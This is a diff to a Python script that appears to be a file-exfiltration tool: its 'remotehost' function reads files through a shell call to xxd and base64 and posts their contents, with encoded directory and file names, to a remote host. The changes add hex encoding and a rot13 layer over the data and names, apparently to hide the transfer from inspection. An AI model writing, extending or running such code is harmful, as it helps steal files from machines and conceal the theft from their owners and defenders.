@@ -14,6 +14,7 @@ import base64
 import socket
 import math
 import time
+import binascii
 
 
 sistema = format(platform.system())
@@ -134,14 +135,30 @@ def remotehost(directory, path, remotehost, remoteport):
 	fullpath = fullpath.replace("'", "\'")
 
 	data = os.popen("xxd -p '" + fullpath + "' | base64 -w 0").read()
-	#Name of the file encoded and reversed.
-	directory = base64.b64encode(directory.encode())
-	directory = directory[::-1]
+	
 
-	path = base64.b64encode(path.encode())
+	#Name of the file encoded and reversed.
+	directory = binascii.hexlify(directory.encode("utf-8"))
+	directory = base64.b64encode(directory)
+	directory = directory[::-1]
+	directory = directory.decode("utf-8")
+	
+
+	path = binascii.hexlify(path.encode())
+	path = base64.b64encode(path)
 	path = path[::-1]
+	path = path.decode("utf-8")
+	
+	
 
 	#Create a json with data.
+	if (args.udp == False):
+		data = rot13(data)
+		directory = rot13(str(directory))
+		path = rot13(str(path)) 
+	
+	print (directory, path)	
+		
 	jsondata = {"dir": directory, "name": path, "data": data}
 
 	try:
@@ -210,6 +227,13 @@ def remotehost(directory, path, remotehost, remoteport):
 			response = requests.post(url, json=jsondata)
 	except:
 		pass
+		
+def rot13(string):
+    # create a translation table
+    rot13 = str.maketrans(
+        "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
+        "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
+    return string.translate(rot13)
 
 ########## Main function #################3
 if __name__ == "__main__":
